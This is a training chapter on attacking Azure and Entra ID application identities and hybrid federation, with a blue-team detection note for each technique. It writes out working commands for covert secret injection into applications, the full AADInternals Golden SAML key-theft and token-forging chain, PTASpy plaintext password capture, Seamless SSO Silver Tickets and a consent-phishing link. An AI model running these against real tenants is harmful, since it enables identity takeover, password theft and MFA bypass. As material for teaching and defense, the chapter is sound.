---
title: "17. Azure Applications and Attack Strategies"
order: 17
part: "C2 & Cloud"
description: "App registrations and service principals, SAML/OAuth/OIDC, federation, Golden SAML and hybrid identity attacks."
---

This section teaches, from scratch, how an application gains an identity in Entra ID (formerly Azure AD), how these identities can be abused when misconfigured, the internal workings of the authentication protocols in use (SAML, OAuth2, OIDC, WS-Fed), and the attacks (above all **Golden SAML**) against **hybrid identity / federation** architectures that join on-prem AD with the cloud. Each technique comes with a **Detection/Defense (Blue team)** note. For token theft, PRT, and device registration attacks, see Section 16; this section focuses on application identity and the federation trust layer.

The basic distinction must be clear from the start: in Entra, **"user"** (human account) and **"workload identity"** (application/service identity) are two separate families of objects. This entire section concerns the latter: application identities and the trust relationships that come with federation. Workload identities often fall outside the scope of MFA and Conditional Access; this makes them a priority review target in an assessment.

## 17.1 Application identities: App Registration, Service Principal, Managed Identity

In Entra, an application's identity is expressed through **three** concepts. Confusing these is a classic trap.

### App Registration (Application object)

- An application's **global definition / template** in Entra. Technically it is an **Application object**, and there is exactly **one** of it in the application's "home" tenant.
- What it contains:
- **Application (client) ID**: the application's globally unique identifier (`appId`).
- **Redirect URI (reply URL)**: the address to which the authorization code/token is sent in the OAuth flow. Loose configuration (`http://`, wildcard, `localhost`, open redirect) is the main vulnerability for token leakage.
- **Credentials**: the application's "password": a **client secret** (plain-text string) or a **certificate** (asymmetric, more secure). **More than one** secret/cert can be added to an application; this is the basis of the attack we will see shortly.
- **API permissions**: which APIs the application can access (most often Microsoft Graph); of delegated or application type.
- **Owners**: the accounts that can manage the App Registration. An owner can take over the identity by adding a new credential.
- The tenant that hosts the App Registration is the **home tenant**. In multi-tenant applications the Application object is singular, but a separate Service Principal is created in **every** tenant that uses the application.

### Service Principal (SP)

- The App Registration's **concrete instance in a specific tenant (local instance)**. When the application actually "signs in", "gets a permission", or "is assigned a role" in a tenant, these happen on the **SP**.
- Analogy: Application object = **class**, Service Principal = **instance (object)**. The SP is the running copy of the template in a tenant.
- SP types: **Application** (bound to a normal App Registration), **Managed Identity** (bound to an Azure resource), **Legacy/Microsoft Application** (first-party or legacy).
- **RBAC roles (Owner, Contributor...) and Entra directory roles (Global Administrator...) are assigned to the SP, not to the Application object.** This is why the privesc target is usually the SP.
- The SP can also have its own **owners**, and since the `appId` is shared, a secret/cert added to the App Registration is also valid for the SP.

### Managed Identity

- A special SP type bound to an **Azure resource** (VM, Function App, App Service, Logic App, AKS, Automation Account...) that accesses Azure/Graph APIs **without a managed secret**. The token is obtained from inside the resource via **IMDS** (Instance Metadata Service, `169.254.169.254`); this token theft is covered in Section 16.
- It has two kinds:

| Managed Identity type | Lifecycle | Sharing | Note |
| --- | --- | --- | --- |
| **System-assigned** | Created/deleted together with the resource (1:1) | Bound to a single resource, cannot be shared | When the resource is deleted, the SP is also deleted |
| **User-assigned** | Lives as an independent Azure resource | Can be assigned to multiple resources (1:N) | The SP remains even if the resource is deleted; multiple VMs can share the same identity |

### Relationship summary

| Concept | What it is | Where/how many | What is assigned to it |
| --- | --- | --- | --- |
| **App Registration (Application object)** | Global template/definition | **1** in the home tenant | Redirect URI, API permission, credential, owner |
| **Service Principal** | The template's instance in the tenant | **1 in every tenant** that uses the application | RBAC + Entra roles, consent, local credential/owner |
| **Managed Identity** | Automatic SP bound to an Azure resource | Per resource (system) or independent (user) | Azure RBAC; no secret |

**Note:** App Registration = the application's global **definition/template** (Application object, singular in the home tenant). Service Principal = that application's **instance in a tenant**, and the object that roles/permissions are actually attached to. Managed Identity = an automatically managed, passwordless SP bound to an Azure resource. The answer to the question "who is the role assigned to?" is always the **Service Principal**.

### Delegated vs Application permissions and admin consent

Microsoft Graph (and other API) permissions come in two modes; the distinction is critical to understanding the attack surface:

|  | **Delegated permission** | **Application permission** |
| --- | --- | --- |
| On whose behalf it operates | On behalf of the signed-in **user** (on-behalf-of) | On the application's **own** behalf (app-only, no user) |
| Effective authority | Application permission **∩** user's authority (intersection of the two) | As much as the permission grants directly (not limited by the user) |
| Flow | Authorization code, device code, ROPC | Client credentials |
| Consent | User consent is enough for most low-risk scopes | **Admin consent is always** required |
| Privesc risk | Lower (limited by user authority) | **High**: not tied to a user, runs 24/7, no MFA |

- **Admin consent:** For highly privileged scopes and **all application permissions**, approval from an administrator (Global Admin, Privileged Role Admin, or Cloud Application Admin) is required. Once approval is given, an **oauth2PermissionGrant** (delegated) or **appRoleAssignment** (application) record is created on the relevant SP.
- From an attack perspective, the valuable ones are **application permissions**: the user/MFA/Conditional Access drop out of the picture, and anyone who has the application's secret can act with that permission 24/7.

**Detection/Defense:** Monitor consent events that include dangerous application permissions via Entra **Audit log** → *"Add app role assignment to service principal"* and *"Consent to application"* records. Dump all OAuth grants across the tenant with `Get-AzureADPSPermissions.ps1` (or Graph-based equivalents). Restrict user consent (**turn off user consent** or allow it only for low-risk verified applications) and turn on **Admin Consent Workflow**.

## 17.2 Application attack strategies

### Adding a client secret / certificate (credential addition)

Logic: anyone who can add a new credential to an App Registration or SP (the application's **owner**, or the **Application Administrator** / **Cloud Application Administrator** role) can sign in **as the application** and take over **all** of its permissions. Knowing the application's existing secret is not necessary; with `--append` a **new** secret is added without deleting the existing one, so the attack does not break legitimate use and stays quiet.

```
# 1) ADD a new client secret to the target application (keeps the existing ones):
az ad app credential reset --id <appId> --append --display-name "backup" --end-date 2027-01-01
# --id           : the App Registration's appId or objectId
# --append       : adds a new credential WITHOUT deleting the existing ones (append). Without the flag, ALL are overwritten!
# --display-name : a name for the credential (a legitimate-looking name to leave no trace)
#   --end-date     : son kullanma tarihi
# in the output the "password" field = the new client secret (shown once)

# Alternative of adding a certificate (logged less, harder to detect):
az ad app credential reset --id <appId> --create-cert --append    # generates a self-signed cert
az ad app credential reset --id <appId> --cert "@./mycert.pem" --append   # add an existing cert

# the same can be done on the SP:
az ad sp credential reset --id <spId> --append
```

```
# 2) Sign in as the application (SP) → act with all the application's permissions:
az login --service-principal -u <appId> -p <client_secret> --tenant <tenantId>
# -p can also be a certificate file path: -p ./cert.pem
az login --service-principal -u <appId> -p ./cert.pem --tenant <tenantId>

# To carry the Graph token to other tools:
az account get-access-token --resource-type ms-graph
```

- **Tool alternatives:** `New-AzADAppCredential` / `New-AzADSpCredential` (Az PowerShell), Microsoft Graph PowerShell `Add-MgApplicationPassword -ApplicationId <id>`, the raw Graph call `POST /applications/{id}/addPassword`. MicroBurst and PowerZure wrap this flow.
- **Known behavior:** on some applications that already have a key on them, `--append` can give the error *"update to an existing credential is not allowed"*; adding via the portal/Graph works in this case (a known, version-dependent behavior of Azure CLI).

**Detection/Defense:** Monitor Entra **Audit log** → *"Update application - Certificates and secrets management"* / *"Update application"* events, especially those outside the known change window. Protect Application/SP owner assignments and the Application Administrator / Cloud Application Administrator roles as **Tier 0**; review owners regularly. Where possible use a **certificate** and **Managed Identity** instead of a secret, and ban long-lived secrets.

### Privilege escalation via excessive Microsoft Graph application permissions

A high application permission granted to an application can turn into a direct tenant takeover with a compromised secret. The most critical permissions and the privesc effect of **each**:

| Graph application permission | Privesc effect | Why it is dangerous |
| --- | --- | --- |
| `RoleManagement.ReadWrite.Directory` | **Direct Global Admin** | Can assign any Entra directory role (including Global Administrator) to any principal; makes itself GA. The "final stop" of privesc. |
| `AppRoleAssignment.ReadWrite.All` | **Indirect Global Admin** | Can assign app roles (Graph application permissions) to applications: it escalates by assigning **itself** `RoleManagement.ReadWrite.Directory` without admin consent. |
| `Application.ReadWrite.All` | Identity takeover | Can add a credential to any application/SP → sign in as a more privileged SP (lateral/vertical movement). Does not grant GA on its own, but the path to GA often opens from here. |
| `Directory.ReadWrite.All` | Broad but **limited** | Can write group/membership, some user attributes, etc.; however it is **NOT** equivalent to Global Admin on its own (cannot assign privileged roles, cannot reach some sensitive APIs). A nuance that is often overlooked. |
| `User.ReadWrite.All` | Account manipulation | Manages user profiles; **cannot reset administrator accounts' passwords** (privileged users are out of scope). Abused for non-admin accounts. |
| `PrivilegedAccess.ReadWrite.AzureAD` / `...AzureADGroup` | PIM manipulation | Changes PIM (Privileged Identity Management) eligibility/assignments to lay the groundwork for a privileged role. |
| `GroupMember.ReadWrite.All` | Privesc via group | Adds members to privileged groups (e.g., a role-assignable group). |

Example chain (AppRoleAssignment.ReadWrite.All → Global Admin):

```
1) The compromised SP has AppRoleAssignment.ReadWrite.All.
2) Assign the RoleManagement.ReadWrite.Directory app role to the SP (POST /servicePrincipals/{id}/appRoleAssignments)
   -> admin consent is NOT required, because the SP grants the permission itself.
3) Now use RoleManagement.ReadWrite.Directory to make yourself Global Administrator.
```

- **SpecterOps finding (2024):** `Directory.ReadWrite.All` is often assumed to be "equivalent to Global Admin", but it is not; the pair that **guarantees** a path to GA is `RoleManagement.ReadWrite.Directory` and `AppRoleAssignment.ReadWrite.All`.
- The high-risk trio (`Application.ReadWrite.All`, `AppRoleAssignment.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`) is flagged together as "danger" in industry detection rules.

**Detection/Defense:** Alert on new **appRoleAssignment** events (especially the scopes above) via Entra Audit log; an SP assigning an app role **to itself** is a very strong indicator. Periodically dump all SP app-role assignments; grant `Directory.ReadWrite.All` and above only to applications that genuinely need them; prefer **Conditional Access (Workload Identities)** and **Managed Identity** for workload identities.

### Owner abuse

An App Registration or SP's **owner** can **add a credential** to it independent of the application's permissions → signs in as that application/SP and takes over its rights. If a low-privileged account has been made owner of a high-privileged SP, this is a privesc path. BloodHound/AzureHound shows this relationship as an **`Owns` / `AZOwns`** edge and maps the path to privileged SPs.

**Detection/Defense:** Regularly audit the owner lists of privileged applications/SPs; monitor owner additions (the *"Add owner to application/service principal"* audit event). Do not make personal accounts owners of critical SPs.

### Dynamic group and self-service group abuse

- **Dynamic group abuse:** Groups whose membership is determined automatically by a **rule** (e.g., `user.department -eq "IT"` or `user.otherMails -contains ...`) can be abused. The attacker changes a user attribute they can write (`User.ReadWrite.All`, or fields the user can edit themselves) to match the rule, and is **automatically** included in the **privileged group**. If the group is tied to an Azure role/application access, this is direct privesc.
- **Self-service group abuse:** groups that users can add themselves to produce the same effect.

**Detection/Defense:** Do not base dynamic group rules on attributes **the attacker can write** (otherMails, display attributes). Make groups that grant privilege **role-assignable** (only highly privileged roles can change their membership). Monitor group membership changes and user attribute updates.

### Consent phishing (illicit consent grant)

The attacker registers their own (multi-tenant) application, gives it a name/logo that looks legitimate, and sends the victim a link to the OAuth **consent** screen. If the victim clicks "Accept", the application is granted **delegated** permission to the victim's data (Mail.Read, Files.ReadWrite, offline_access...); the attacker gains persistent access via a **refresh token** without ever touching a password or MFA. Even if the password is reset, access continues until the existing refresh token is revoked. MITRE: **T1528 / T1566**.

```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<evil_app>&response_type=code&redirect_uri=<attacker>&
  scope=offline_access%20Mail.Read%20Files.Read.All&...
```

- Tools: **GraphRunner** (malicious app deployment via `Invoke-InjectOAuthApp`; needs verification, function name from the project wiki), **365-Stealer**, **o365-attack-toolkit**, **Illicit Consent Grant** scenarios.

**Detection/Defense:** Monitor *"Consent to application"* in the Entra Audit log and "risky OAuth app" alerts in Defender for Cloud Apps. **Restrict user consent** (verified publisher only + low-risk scopes) and turn on **Admin Consent Workflow**. Revoke suspicious grants with Graph/PowerShell (`Remove-MgOauth2PermissionGrant`, remove the SP), and **revoke** the tokens of affected users. Refresh token revocation is a **separate** step from password reset.

## 17.3 Authentication protocols (understand)

### SAML (Security Assertion Markup Language) 2.0

- An **XML-based federation** protocol; the classic carrier of enterprise SSO. Two roles:
- **IdP (Identity Provider):** the party that authenticates the user (e.g., AD FS, Okta, Entra).
- **SP (Service Provider / Relying Party):** the application that trusts the identity (e.g., Microsoft 365, Salesforce).
- Flow (SP-initiated, the most common):

1. The user goes to the SP; the SP generates a **SAML AuthnRequest** and redirects the user to the IdP.
2. The IdP authenticates the user (password/MFA) and generates a signed **SAML Assertion** (token).
3. The assertion is POSTed to the SP via the user's browser (`SAMLResponse`).
4. The SP verifies the signature with the IdP's **token-signing certificate's public key**; if valid, the session is opened.

- **The signature is the entirety of the trust.** The SP trusts the IdP's public key (from federation metadata); the **private key** resides at the IdP. Whoever obtains this private key can sign any assertion they want → **Golden SAML** (17.5). The signature is done with **XML-DSig**; loose validation is also open to **XML Signature Wrapping (XSW)** attacks.
- Important assertion elements: `Issuer` (IdP identity), `Subject/NameID` (user; the on-prem `ImmutableId` in M365), `Conditions` (`NotBefore`/`NotOnOrAfter` validity, `AudienceRestriction` = target SP), `AuthnStatement`, `<ds:Signature>`.

### OAuth 2.0

- It is an **authorization** framework: it solves the problem of "grant this application access to this resource", not "authenticate the identity". It issues an access token (+ often a refresh token). Flows:

| Flow (grant) | Use case | Is there a user? | Is MFA enforced | From an attack perspective |
| --- | --- | --- | --- | --- |
| **Authorization Code + PKCE** | Web/mobile/SPA; user in browser | Yes | Yes | PKCE prevents code interception; redirect URI vulnerability is still a risk |
| **Client Credentials** | Application-to-application (daemon), no user | No | No | Works with **application permission**; 24/7 access once the secret/cert is compromised |
| **Device Code** | Input-constrained device (TV, CLI) | Yes | Yes | **Device-code phishing**: the victim enters the attacker's code, the token goes to the attacker (17.5/Section 16) |
| **ROPC (Resource Owner Password Credentials)** | Old/legacy, user+pass directly to the application | Yes | **No** | Ideal for **password spray**; in most cases does not bypass MFA/Conditional Access, but exposes accounts without MFA |
| **Implicit** | Old SPA (token directly in the URL fragment) | Yes | Yes | The token leaks in the URL; **deprecated**, replaced by Auth Code + PKCE |

### OpenID Connect (OIDC)

- An **identity layer on top of** OAuth 2.0. In addition to "grant access", it answers the question of "who is the user". In addition to an access token, it issues an **ID token** (JWT); it carries identity claims like `sub`, `name`, `email`, `nonce`. Entra's modern web sign-in is OIDC.

### WS-Federation

- An **older** federation protocol left over from the SAML era (used in the classic integration of AD FS with M365). Conceptually the same trust model as SAML (the IdP signs, the RP/SP trusts), but a different message format. The Golden SAML logic also applies in the WS-Fed flow.

### Token structure (JWT and SAML claims)

Both OAuth/OIDC (JWT) and SAML tokens are, by the same logic, **packages of signed claims**; weaknesses in validation open the door to replay/forge attacks.

| Claim | JWT (OAuth/OIDC) | SAML equivalent | What it validates |
| --- | --- | --- | --- |
| Audience | `aud` | `AudienceRestriction` | **Which resource/SP** the token is valid for: incorrect checking means the token is used on another service |
| Issuer | `iss` | `Issuer` | **Which IdP/STS** produced the token |
| Validity start | `nbf` (not before) | `Conditions NotBefore` | Must not be accepted while not yet valid |
| Validity end | `exp` | `Conditions NotOnOrAfter` | An expired token must be rejected (replay window) |
| Subject/user | `sub` / `oid` / `upn` | `Subject / NameID` | On whose behalf |
| Delegated scope | `scp` | - | Delegated permissions |
| Application role | `roles` | `AttributeStatement` | Application permission / app roles |
| Signature | JWS (`alg`, `kid` + signature) | `<ds:Signature>` (XML-DSig) | Integrity and origin; **the foundation of all trust** |

**Note:** OAuth = **authorization**, OIDC = **identity** on top of it (authentication, ID token), SAML/WS-Fed = XML-based **federation**. In SAML, **the IdP signs, the SP trusts**; the signing key is in the IdP's hands. If `aud` (target resource) and `iss` (issuer) are validated incorrectly, the token is used elsewhere or forged.

## 17.4 Hybrid identity / federation methods (how they work)

**Entra Connect** (formerly Azure AD Connect) links on-prem AD with Entra. Four basic methods and how they work internally:

### PHS: Password Hash Synchronization

- A "**hash of the hash**" (SHA256, HMAC, salted, 1000 iterations; the original NT hash never goes to the cloud) of the password hash (NT hash) in on-prem AD is periodically synchronized to Entra. Authentication happens **in the cloud**; there is no dependency on on-prem.
- From an attack perspective: whoever compromises the Entra Connect server can pull the hashes of **all users** via DCSync, using the sync account (`MSOL_` / `Sync_`) (see the DCSync explanation in the relevant section).

### PTA: Pass-Through Authentication

- Password verification is forwarded **not to the cloud but** to on-prem AD via the **PTA Agent** (`AzureADConnectAuthenticationAgentService`) installed on-prem. Entra gives the encrypted password to the agent, the agent queries AD, and returns the result. The password hash is not kept in the cloud.
- From an attack perspective: if the server hosting the agent is compromised, plain-text passwords are captured with a **PTA agent backdoor** (17.5), and any desired login is made to succeed.

### Seamless SSO (Desktop SSO)

- A user on a domain-joined machine signs into Entra silently **without entering a password** from the corporate network. Entra Connect creates a computer account in AD named **`AZUREADSSOACC$`** and defines an SPN for `https://autologon.microsoftazuread-sso.com`; the browser presents a Kerberos ticket to this SPN, and Entra validates it. It is used **together with** PHS or PTA.
- From an attack perspective: the `AZUREADSSOACC$` account's password **does not rotate on its own**, and if its hash is obtained, a **Silver Ticket** (17.5) can be produced.

### AD FS federation

- Authentication is delegated entirely to **on-prem AD FS**. Entra marks the domain as "federated"; when the user goes to M365 they are redirected to AD FS, AD FS authenticates them and produces a **signed SAML/WS-Fed token**, and M365 trusts this token.
- From an attack perspective: if AD FS's **token-signing** private key plus its **DKM** master key are obtained, tokens can be produced on behalf of anyone via **Golden SAML** (17.5).

| Method | Where authentication happens | Secret that goes to the cloud | Main attack |
| --- | --- | --- | --- |
| **PHS** | Cloud | Hash of the hash | Sync account → DCSync; Connect server compromise |
| **PTA** | On-prem agent | None (the password is forwarded on the fly) | PTA agent backdoor (plain-text password capture) |
| **Seamless SSO** | Kerberos (on-prem) | `AZUREADSSOACC$` account | Silver Ticket (using the account's hash) |
| **AD FS** | On-prem AD FS | Trust in the token-signing cert | Golden SAML |

**Note:** PHS synchronizes the "hash of the hash" to the cloud (authentication happens in the cloud). In PTA, the password is forwarded to the on-prem agent (the hash does not go to the cloud). Seamless SSO's signature is the **`AZUREADSSOACC$`** computer account, and its password does not change on its own. In AD FS, the trust is the token-signing certificate.

## 17.5 Federation / SSO attacks (complete)

### Golden SAML

**Idea:** an attacker who obtains AD FS's **token-signing** certificate's **private key** can sign **their own SAML token** for **any user they want**. This is the on-prem-to-cloud analog of the "Golden Ticket" (what the krbtgt hash is in Kerberos, the token-signing private key is here). Result: **passwordless**, **MFA-bypassing** full cloud (M365/Entra) access that, because the token is produced outside AD FS, **creates no sign-in event in AD FS**. MITRE: **T1606.002 (Forge Web Credentials: SAML Tokens)**.

**Why it works (mechanism):** M365 trusts AD FS's public key; if the signature is valid, it does not question how the assertion was produced. The token-signing private key is stored **encrypted** in the AD FS **config database** (WID or SQL); the decryption key is held in a **DKM (Distributed Key Management)** object in AD. Whoever obtains both extracts the certificate in the clear.

**Theft chain (prerequisite: AD FS service account context, or DKM read + config DB access):**

```
# AADInternals (import):
Import-Module AADInternals

# 1) Extract the AD FS configuration (config DB):
# a) on AD FS server, with local admin:
$ADFSConfig = Export-AADIntADFSConfiguration -Local
# b) Remotely, with the AD FS service account's NT hash + SID (the hash is obtained via DCSync):
$ADFSConfig = Export-AADIntADFSConfiguration -Hash "<NTHash>" -SID "<serviceAccountSID>" -Server sts.company.com
# (for the NT hash: Get-AADIntADUserNTHash  - replication rights; or Get-AADIntLSASecrets -AccountName sv_ADFS - local admin)

# 2) Extract the config decryption (DKM) key:
#    a) on the AD FS server, locally:
$ADFSKey = Export-AADIntEncryptionKey -Local -Configuration $ADFSConfig
# b) remotely, with DCSync + DKM object GUID:
$ADFSKey = Export-AADIntADFSEncryptionKey -Server dc.company.com -Credentials $cred -ObjectGuid "<DKM-GUID>"

# 3) Extract the token-signing certificate (as a cleartext .pfx):
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $ADFSKey
# on the AD FS server it also runs without parameters: Export-AADIntADFSCertificates
# Output: ADFS_signing.pfx (no password), ADFS_encryption.pfx

# 4) Collect the Issuer URI and the target user's ImmutableId:
$Issuer = (Get-MsolDomainFederationSettings -DomainName company.com).IssuerUri   # Azure side
# or on AD FS: $Issuer = (Get-ADFSProperties).Identifier.OriginalString
Get-MsolUser | select UserPrincipalName,ImmutableId                              # target ImmutableId

# 5) FORGE a SAML token as the user and get a cloud access token:
$saml = New-AADIntSAMLToken -ImmutableID "<hedefImmutableId>" -PfxFileName .\ADFS_signing.pfx -Issuer $Issuer
Get-AADIntAccessTokenForEXO -SAMLToken $saml -SaveToCache      # Exchange Online token, into the cache
# or drop straight into the portal in a browser:
Open-AADIntOffice365Portal -ImmutableID "<hedefImmutableId>" -PfxFileName .\ADFS_signing.pfx -Issuer $Issuer -Browser Chrome
```

- **Alternative tools / chain:**
- **shimit** (Sygnia): produces a SAML token with the stolen token-signing key and signs in.
- **ADFSDump / ADFSpoof** (Mandiant/FireEye): `ADFSDump` dumps the AD FS config + DKM data, `ADFSpoof` produces a forged SAML token with this data.
- **WhiskeySAML / TicketsPlease** (Secureworks): obtains the AD FS key remotely and automates Golden SAML (listed on CISA).
- The correct cmdlet in AADInternals is **`Export-AADIntADFSCertificates`** (decrypts and exports the token-signing and encryption certificates using the DKM key).

**Detection/Defense:**

| Indicator | Source |
| --- | --- |
| AD FS **Event ID 1007**: certificate export (rare, few legitimate reasons) | AD FS server Windows event log |
| AD FS **Event ID 307** (configuration changed) + **Event ID 510** details with the same Instance ID | AD FS admin/audit log |
| AD FS token events **1200** (token issued) / **1202** (credential validated): a forged token does not produce these | AD FS audit |
| **Config DB access** (WID `ServiceSettings` table), via SQL audit | WID/SQL |
| **Correlation:** a federated session exists in the M365/Entra sign-in log but the corresponding event is **missing** in AD FS → a strong indicator of a forged token | Entra sign-in + AD FS log |

- The most reliable reference for certificate export is **AD FS Event ID 1007** (some sources say 70; 1007 is more reliable).
- **Defense:** isolate AD FS as **Tier 0** (anything that can read DKM is Tier 0); **rotate** the token-signing certificate regularly (rotate it twice to invalidate the old key); restrict/audit AD FS DB and DKM access; where possible move from AD FS to **PHS + cloud auth** (removes the attack surface). Microsoft makes key theft harder with **ESAE/MFA + token-signing key in an HSM**.

### PTA agent backdoor

An attacker who compromises the PTA agent server (local admin) injects a malicious DLL into the agent service, captures **all authenticated passwords in plain text**, and makes any login they want be accepted as "successful" (whatever the password is): a persistent, quiet backdoor.

```
# AADInternals (local admin, on the PTA agent server):
Install-AADIntPTASpy
# injects a DLL into AzureADConnectAuthenticationAgentService; logs validated passwords.
# Default log: C:\PTASpy\PTASpy.csv
Get-AADIntPTASpyLog -DecodePasswords    # show the captured plaintext passwords
```

- Alternative/extension: an attacker who compromises Global Admin can also get into the password flow by installing and registering a new PTA agent on **their own** server (cloud-only prerequisite).
- **Important:** the `Install-AADIntPTASpy` function may have been removed in **current** versions of AADInternals (the changelog shows PTASpy was removed in 0.9.4); the technique is still valid, but whether the cmdlet exists in the current version **must be verified**.

**Detection/Defense:** treat PTA agent servers as **Tier 0**; monitor with EDR for unexpected DLL injection into the service/child processes (`AzureADConnectAuthenticationAgentService` anomalies); look for artifacts like `C:\PTASpy\`; alert on new **PTA agent registration** events (Entra portal → PTA agents); restrict permission to install agents.

### Seamless SSO: `AZUREADSSOACC$` Silver Ticket

If the `AZUREADSSOACC$` computer account's NTLM hash (or AES key) is obtained, the attacker **forges** an **offline** Kerberos service ticket (Silver Ticket) **without ever touching a domain controller**, and signs into Entra as **any UPN in the tenant** by presenting it to the `autologon.microsoftazuread-sso.com` SPN. Because the account's password does not rotate on its own, access is **persistent**. MITRE: **T1558.002 (Silver Ticket)**.

```
# Get account hash from AD (DCSync / Entra Connect server), e.g. AADInternals:
Get-AADIntDesktopSSOAccountPassword ...        # AZUREADSSOACC$ password/key
# Silver ticket forge: Mimikatz (kerberos::golden ...), Rubeus, AADInternals New-AADIntKerberosTicket,
# or move from a Kerberos ticket to cloud access with SeamlessPass (Python).
```

- Tools: **AADInternals**, **Mimikatz**, **Rubeus**, **SeamlessPass**.

**Detection/Defense:** monitor **Event ID 4769** (Kerberos service ticket) records where service name = `AZUREADSSOACC$`, and the **RC4 (etype 0x17)** encryption type (the account should use AES; an RC4 downgrade is suspicious); **rotate** the `AZUREADSSOACC$` password **regularly** (manual rollover with Entra Connect); protect the Entra Connect server as Tier 0; turn off Seamless SSO if it is not needed.

### Token forgery / replay

Replaying stolen SAML/OAuth/OIDC tokens, or forging them by exploiting weak validation. Vulnerable points: skipping/loosening `aud` (target resource) and `iss` (issuer) validation, accepting an expired (`exp`) token, **XML Signature Wrapping** and missing signature validation in SAML, theft of a long-lived **refresh token** (password reset does not revoke these). Golden SAML and consent phishing are extreme examples of this class.

**Detection/Defense:** strict validation of `aud`/`iss`/`exp`/`nbf` and the signature; shortening token lifetime; instant revocation with **Continuous Access Evaluation (CAE)**; **revoking** the user's session/token when a stolen token is suspected; binding to device/location with Conditional Access.

## 17.6 Tools

| Tool | Focus | Typical use |
| --- | --- | --- |
| **AADInternals** | Federation / token / AD FS / PTA / Seamless SSO | Golden SAML (`Export-AADIntADFSConfiguration`, `Export-AADIntADFSCertificates`, `New-AADIntSAMLToken`), PTA backdoor, hybrid attacks |
| **ROADtools / roadtx** | Entra recon + token/device/PRT | Tenant dump with `roadrecon`; device code, ROPC, PRT, interactive auth via Selenium with `roadtx` |
| **TokenTactics / TokenTacticsV2** | OAuth token manipulation | Obtaining tokens via device code, converting a refresh token to different audiences (Graph, EXO...) |
| **GraphRunner** | Microsoft Graph post-exploit | Obtaining tokens with `Get-GraphTokens` (verified); recon, mailbox/SharePoint/OneDrive/Teams pillaging, OAuth app injection (other cmdlet names from the project wiki; need verification) |
| **shimit** | Golden SAML | Producing a SAML token with the stolen token-signing key and signing in |
| **ADFSDump / ADFSpoof** | Golden SAML (Mandiant) | Config+DKM dump → forged SAML token |
| **MicroBurst / PowerZure** | General Azure post-exploit | Credential addition, SP abuse, resource enum/privesc |
| **MFASweep** | MFA gaps | Scans which M365/Entra endpoints can be accessed without MFA |
| **MailSniper** | M365 mail search | Sensitive email/password hunting in Exchange Online, GAL enum |
| **BloodHound / AzureHound** | Azure attack path graph | Privesc paths via Owner/role/consent edges |

**Common mistakes (summary):**

- **App Registration** = the application's global template (Application object, singular in the home tenant); **Service Principal** = that application's instance in a tenant, the object that **roles/permissions are attached to**; **Managed Identity** = an automatic, secret-free SP bound to an Azure resource (system- or user-assigned).
- An application/SP's **owner**, or **Application Administrator / Cloud Application Administrator** → adds a secret with `az ad app credential reset --append` → signs in as the application with `az login --service-principal`.
- **Delegated** permission intersects with the user and is limited; **application** permission is independent of the user, always requires admin consent, and is valuable for privesc.
- Graph permissions that lead directly to Global Admin: **`RoleManagement.ReadWrite.Directory`**(makes itself GA) and**`AppRoleAssignment.ReadWrite.All`**(escalates by assigning itself RoleManagement permission).**`Directory.ReadWrite.All` is not GA on its own.**
- **Golden SAML** = forging a SAML token for any desired user with the stolen AD FS token-signing private key (config DB + DKM master key); **it bypasses MFA**, **produces no sign-in event in AD FS**; detection = certificate export **Event ID 1007**, configuration change 307/510, and AD FS ↔ M365 sign-in correlation.
- **Seamless SSO**'s signature is the **`AZUREADSSOACC$`**account; a**Silver Ticket**is forged with its hash, its password does not rotate on its own → persistence; detection =**Event ID 4769** + RC4 anomaly.
- The **PTA** backdoor captures plain-text passwords; **PHS** synchronizes the "hash of the hash" to the cloud; the place of validation is the cloud for PHS and the on-prem agent for PTA.
- SAML: **the IdP signs, the SP trusts**; OAuth is **authorization**, OIDC is **identity** (ID token) on top of it. The critical claims in token validation are **`aud` / `iss` / `nbf` / `exp` / signature**.
